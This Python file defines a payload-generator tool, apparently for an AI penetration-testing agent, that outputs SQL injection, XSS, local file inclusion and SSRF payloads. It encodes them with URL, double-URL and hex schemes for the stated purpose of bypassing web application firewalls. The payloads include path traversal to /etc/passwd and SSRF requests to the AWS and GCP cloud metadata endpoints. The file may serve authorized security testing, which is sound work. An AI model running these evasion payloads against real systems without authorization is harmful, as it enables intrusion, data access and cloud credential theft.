"""Payload Engine Tool — expert-level obfuscated payloads."""

import urllib.parse
from typing import Any, Dict, List, Optional
from testinggpt.tools.base import BaseTool

class PayloadEngineTool(BaseTool):
    """Tool for generating WAF-bypassing payloads for various vulnerability types."""

    def __init__(self) -> None:
        """Initialize PayloadEngineTool."""
        super().__init__(
            name="payload_engine",
            description="Generate WAF-bypassing payloads for SQLi, XSS, SSRF, and LFI using expert-level obfuscation techniques (Unicode, Hex, Double-encoding)."
        )

    def get_schema(self) -> dict[str, Any]:
        """Get parameter schema for payload generation."""
        return {
            "type": "object",
            "properties": {
                "vulnerability_type": {
                    "type": "string",
                    "enum": ["sqli", "xss", "lfi", "ssrf"],
                    "description": "The type of vulnerability to generate payloads for."
                },
                "target_platform": {
                    "type": "string",
                    "description": "The target platform (e.g., 'linux', 'windows', 'mysql', 'php').",
                    "default": "generic"
                },
                "obfuscation_level": {
                    "type": "string",
                    "enum": ["none", "medium", "aggressive"],
                    "default": "aggressive",
                    "description": "How much obfuscation to apply."
                }
            },
            "required": ["vulnerability_type"]
        }

    def _obfuscate(self, payload: str, level: str) -> List[str]:
        """Apply obfuscation to a base payload."""
        results = [payload]
        
        if level == "none":
            return results

        # 1. URL Encoding (Standard)
        results.append(urllib.parse.quote(payload))
        
        # 2. Double URL Encoding (Aggressive)
        if level == "aggressive":
            results.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
        # 3. Unicode / Hex (Aggressive)
        if level == "aggressive":
            hex_encoded = "".join([f"\\x{ord(c):02x}" for c in payload])
            results.append(hex_encoded)
            
        return results

    async def execute(self, vulnerability_type: str = "", target_platform: str = "generic", obfuscation_level: str = "aggressive", **kwargs: Any) -> dict[str, Any]:
        """Generate the payloads."""
        if not vulnerability_type:
            return {"success": False, "result": "", "error": "No vulnerability type provided"}

        base_payloads = {
            "sqli": [
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
                "' OR '1'='1' --"
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)"
            ],
            "lfi": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "expected_file.php?file=php://filter/read=convert.base64-encode/resource=index.php",
                "C:\\Windows\\win.ini"
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://[::]:80/",
                "http://0x7f000001/",
                "http://metadata.google.internal/computeMetadata/v1/"
            ]
        }

        selected = base_payloads.get(vulnerability_type, [])
        final_payloads = []
        
        for p in selected:
            final_payloads.extend(self._obfuscate(p, obfuscation_level))


        summary = (
            f"--- EXPERT PAYLOAD GENERATOR ---\n"
            f"Type: {vulnerability_type.upper()}\n"
            f"Platform: {target_platform}\n"
            f"Obfuscation: {obfuscation_level}\n\n"
            f"SUGGESTED PAYLOADS:\n" + 
            "\n".join([f"  - {p}" for p in list(set(final_payloads))[:12]])
        )

        return {
            "success": True,
            "result": summary,
            "payloads": list(set(final_payloads))
        }
